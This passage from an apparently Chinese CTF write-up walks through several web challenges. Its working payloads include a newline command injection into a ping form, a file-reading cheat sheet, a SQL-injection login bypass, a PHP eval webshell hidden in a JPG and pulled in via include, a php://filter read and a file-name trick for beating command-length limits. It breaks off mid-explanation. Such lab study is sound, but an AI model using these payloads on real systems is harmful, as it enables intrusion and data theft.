    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$return_code</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Failed to execute command."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$ping_result</span> <span class="token operator">=</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token variable">$ping_result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出ping结果并保留换行</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:6,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>payload：</p> 
<pre data-index="7" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ip=127.0.0.1%0acat%09/f*
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:7,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/99f547dd5bfc0a88e790512689f05357.png" alt="image-20240807222306986"></p> 
<p><span class="words-blog hl-git-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.10283&quot;,&quot;extra&quot;:&quot;{\&quot;words\&quot;:\&quot;linux\&quot;}&quot;}" data-tit="linux" data-pretit="linux">linux</span>常用命令合集：</p> 
<pre data-index="8" class="set-code-hide prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ls   ##查看目录
ls /  ##列出根目录(\)下的所有目录：
echo `tac% fla*`;   ##反字节符
cp fl*g.php a.txt   ##将flag.php拷贝到a.txt
cd ..或者cd ../   ##达到访问上一个目录的目的##../和~/是目录跳转符
tac   ##tac flag 反序输出文件内容
cat   ##
tac /flag   ##抓在根目录的flag
find / -name fla*   ##找到文件名匹配fla*的文件
tac/cat $(find / -name fla*)   ##打印所有文件名匹配fla*的文件
find /html/WWW/ -name fla*  ：在某目录下查找包含fla*的文件
find / -type f -exec grep -Hn "flag{" {} \;
dir /   查看根目录
find / -user root -perm -4000 -print 2&gt;/dev/null   #查看suid权限文件
---------------------------------------------------------------------
mv fl?g.php 1.txt   ##将flag.php改名为1.txt
cp fla?.??? 1.txt      ##将flag.php复制给1.txt
nl flag.php&gt;x.txt
tee file1.txt file2.txt //复制文件
tac /f149_15_h3r3|tee 2

awk '/xxx/' fla?.php   ##输出flag文件中包含字符xxx的行
awk '/xxx/{print}' fla?.php  ##输出flag文件中包含字符xxx的行

?c=grep 'ctfshow' flag.php
（在 fl???php匹配到的文件中，查找含有ctfshow的文件，并打印出包含 ctfshow 的这一行）

cat `ls`    ##直接将当前目录下所有文件打印出来,先执行反引号
#cat `ls`-&gt;cat 当前所有文件名-&gt;当前目录下所有文件打印出来

system("cat flag.php|base64") //把flagbase64编码后输出system("base64 flag.php") //把flagbase64编码后输出
--------------------------------------------------------------------
在linux中与cat有类似功能的有如下字符
cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、awk
more:一页一页的显示档案内容    more flag.php
less:与 more 类似   less flag.php
head:查看头几行  head flag.php
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行  tail flag.php
nl：显示的时候，顺便输出行号  nl flag.php   
od:以二进制的方式读取档案内容  od flag.php
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看     sort flag.php
uniq:可以查看
file -f:报错出具体内容
rev：将文件倒序输出。
strings：strings flag.php

grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings
-----------------------------------------------------------------------
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li><li style="color: rgb(153, 153, 153);">44</li><li style="color: rgb(153, 153, 153);">45</li><li style="color: rgb(153, 153, 153);">46</li><li style="color: rgb(153, 153, 153);">47</li><li style="color: rgb(153, 153, 153);">48</li><li style="color: rgb(153, 153, 153);">49</li><li style="color: rgb(153, 153, 153);">50</li><li style="color: rgb(153, 153, 153);">51</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:8,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<h2><a name="t4"></a><a id="CNSS_267"></a>CNSS娘の宠物商店</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/26474da65c09733a866e244754cfd06e.png" alt="image-20240807205258624"></p> 
<p>开题，需要登录。（前端好看</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/385282e1accf30433a4826503b87671a.png" alt="image-20240807205447973"></p> 
<p>模糊字典测一下，发现登录处存在sql注入。</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/f3624fc7a469a5dd4d61a3d93637c897.png" alt="image-20240807205428813"></p> 
<p>结合题目描述猜测是用万能密码进行登录。</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/819373d3ae4a43d4aba7bb923cc65263.png" alt="image-20240807205410810"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/cb623cf13e9bcdce2131bb60649413d4.png" alt="image-20240807205401421"></p> 
<h2><a name="t5"></a><a id="2048_293"></a>2048</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/80a272d0384612a99fc5c599251bf44e.png" alt="image-20240807222608925"></p> 
<p>一眼前端游戏题</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/35f60143d312ff6b26bd8d6f38e50087.png" alt="image-20240808111207939"></p> 
<p>ban了 F12、Ctrl+U。鼠标表点击谷歌开发者工具就行。</p> 
<p>源代码里面搜索alert、score、flag、cnss。有score也就是记录分数的变量。</p> 
<p>开启一局游戏，随便玩几下</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/8e444c8474376b5f3c5ed80c8f0c8e3a.png" alt="image-20240808111547682"></p> 
<p>然后控制台输入<code>score=9999999999999999999999</code>修改分数</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/42e6acc5755ede79f8d246dbcfd4e05e.png" alt="image-20240808111611679"></p> 
<p>点击flag拿flag。</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/bed6154da1adfa57c66c5421d824f3ef.png" alt="image-20240808111517363"></p> 
<p>看得出来flag是alert出来的，源码看看flag如何出来的</p> 
<p>有一个getflag函数，进行了加密（混淆）</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/e9902366cbee473ed003c50d92905cc9.png" alt="image-20240808111851353"></p> 
<h2><a name="t6"></a><a id="_329"></a>换个头像先</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/94b21290ddbb86ab54e73601790be0b9.png" alt="image-20240808112821547"></p> 
<p>应该是个文件上传。开题需要登录</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/73b5b98572f0e5db94a0008f5a0bb442.png" alt="image-20240808112847578"></p> 
<p>注册个账号然后登录</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/a9582aef8ad0dc351af0278fc74e1759.png" alt="image-20240808112927882"></p> 
<p>更换头像，抓包。前端限制了后缀，上传个jpg后缀的php木马上去</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/f4e09aee6d6d7c7e12803b61a66ba399.png" alt="image-20240808113037984"></p> 
<p>改成php后缀</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/d823c8b35f08ec2eef87d442eee3f8b2.png" alt="image-20240808113205624"></p> 
<p>没给上传到哪的路径，不急，Ctrl+U前端源码看看</p> 
<p>点击访问</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/26f1ad1de5929cce5c4dfcfc1aec91a1.png" alt="image-20240808113237085"></p> 
<p>已经tac到了flag</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/0a7264f071ed392e51f1ebd723692d51.png" alt="image-20240808113304310"></p> 
<h2><a name="t7"></a><a id="can_can_need_shell_363"></a>can can need shell</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/aec10ff38dcc5a96a5de312eb1073fd9.png" alt="image-20240808113343392"></p> 
<p>开题，直接给了源码</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/fb83ef25449612e964e8c8d27f133d20.png" alt="image-20240808144350780"></p> 
<p>是个文件上传，后缀和内容均有过滤。题目没有上传按钮，应该是我自己写一个html表单上传，注意<code>name="uploaded_file"</code></p> 
<pre data-index="9" class="set-code-show prettyprint"><code class="prism language-html has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://152.136.11.155:10108/<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span>
    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uploaded_file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gogogo!<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
   
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:9,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>抓个包慢慢调，后缀是php确定了，其他后缀不解析，看看内容怎么绕过滤</p> 
<p>内容过滤是这些：</p> 
<pre data-index="10" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">$dangerous = array('eval',"[","]","`","*","+","|","url","flag","{","}","@","(",")");
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:10,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>呜，过滤了括号我很难做阿，难做那就别做了（bushi</p> 
<p>首要思路是找个可以不用括号的函数，看下图你应该懂我意思了吧</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/0ef3c45c48b2e645c9368bfe5427c812.png" alt="image-20240808151650246"></p> 
<p>include不用括号也行，同时只包含内容不管后缀即文件种类</p> 
<p>那我们上传一个带马的jpg。</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/7e52ff61689ade2cebcb37edf9c6628f.png" alt="image-20240808151912279"></p> 
<pre data-index="11" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">------WebKitFormBoundary6ofY3JQEOAOo4nWV
Content-Disposition: form-data; name="uploaded_file"; filename="myshell.jpg"
Content-Type: application/octet-stream

&lt;?php eval($_POST[1]);echo 'include success!!!'?&gt;
------WebKitFormBoundary6ofY3JQEOAOo4nWV--
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:11,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>然后上传一个php去包含之前的jpg</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/8c7cea761025c5c1444dddf6370d465a.png" alt="image-20240808152049757"></p> 
<pre data-index="12" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">------WebKitFormBoundary6ofY3JQEOAOo4nWV
Content-Disposition: form-data; name="uploaded_file"; filename="myshell.php"
Content-Type: application/octet-stream

&lt;?php
include '../a3a3ba08c46190b5eb693450637552d5/c8f8f62b73b118b60546893b80b08a48.jpg';
echo 'this is include';
?&gt;
------WebKitFormBoundary6ofY3JQEOAOo4nWV--
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:12,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>访问一下，从echo来看包含成功了，getshell就行</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1d5a095ec4f529c0eab8cf97aa4a1103.png" alt="image-20240808152137864"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/6dd4f704502ce14707a4bc3b01918cb0.png" alt="image-20240808152201472"></p> 
<p>此外还有一个payload，上传一个文件就行：</p> 
<pre data-index="13" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&lt;?php 
include"php://filter/convert.base64-encode/resource=/fl"."ag";
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:13,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<h2><a name="t8"></a><a id="EZRCCCCE_442"></a>EZRCCCCE</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/5ee1ef4389eaf8b22c510d5535e494a3.png" alt="image-20240808152956216"></p> 
<p>开题，直接给了源码</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/93e7d6c3c34644d5e15f77c88383e7a4.png" alt="image-20240808153107728"></p> 
<pre data-index="14" class="set-code-show prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./sandbox/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Th1s_is_4_sandbox"</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(flag|\*|\/|cat|php|bash|txt|tac)/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"hehehehe"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'6'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'6'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>   <span class="token comment">//try to keep fit!</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'6'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:14,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>限制了输入的长度、具备少量WAF。</p> 
<p>WAF绕过不难，最容易想到的就是同义替换或者base64</p> 
<p>主要是思考如何突破长度限制</p> 
<p>在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 <code>\</code>，可以将一条命令写在多行<br> 比如我们有一个test文件内容如下：</p> 
<pre data-index="15" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ec\
ho \
hello \
world!
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:15,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>然后我们用sh命令来执行一下，成功输出了 <code>hello world</code></p> 
<pre data-index="16" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">sh test
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:16,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>在linux中，我们使用<code>ls -t</code>命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p> 
<pre data-index="17" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">touch a
touch b
touch c
ls -t
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:17,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1c043a6d522d4dcdc59234477b9602bd.png" alt="image-20240907045305157"></p> 
<p><code>ls -t</code> 命令列出文件名，然后每个文件名按行储存，如果我们将我们要执行的命令拆分为多个文件名，然后再结合命令换行，然后通过 <code>ls -t &gt; test</code>这样的方式再写入某个文件来运行不就可以绕过命令长度限制了吗，而且从上面我们可以看出，<code>ls -t&gt;test</code>的执行顺序是先创建文件test，然后执行<code>ls -t</code>，然后将执行结果写入test文件</p> 
<pre data-index="18" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ls -t&gt;test
cat test
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:18,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/48be23d6ca21f8fb92dfa93f641cb5c8.png" alt="image-20240907045419600"></p> 
<pre data-index="19" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&gt; "rld"
&gt; "wo\\"
&gt; "llo \\"
&gt; "he\\"
&gt; "echo \\"
ls -t &gt; _
sh _
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:19,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/ba776b2865b5986c0f42d6836ac05590.png" alt="image-20240907045635769"></p> 
<p>这里使用了两个 <code>\</code> 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 <code>\</code> 那么就会被误解为正在多行执行命令，就会出现下面这种情况：</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/b59f777626b2ed513a07f26245e05099.png" alt="image-20240907045835984"></p> 
<p>输入通配符<code>*</code> ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p> 
<pre data-index="20" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&gt;id 
&gt;root
*
